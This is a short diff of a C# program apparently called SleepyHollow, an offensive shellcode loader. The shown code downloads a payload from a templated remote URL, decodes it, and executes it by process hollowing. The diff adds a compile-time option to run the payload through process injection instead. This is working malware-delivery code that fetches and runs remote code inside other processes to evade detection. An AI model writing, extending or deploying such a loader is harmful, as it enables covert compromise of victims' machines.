@@ -1,4 +1,4 @@
-using SleepyHollow;
+﻿using SleepyHollow;
 
 #if !HEADLESS
 using System.CommandLine;
@@ -141,8 +141,17 @@ await rootCommand.InvokeAsync(args);
         var httpClient = new HttpClient();
         var data = await httpClient.GetStringAsync("<%URL%>");
         var buf = Decoder.DecodeString(data);
+#if INJECT
+        await InjectProcess.Run(buf);
+#else
         await HollowProcess.Run(buf);
 #endif
+#endif
+
+
+
+
+
 
 
 
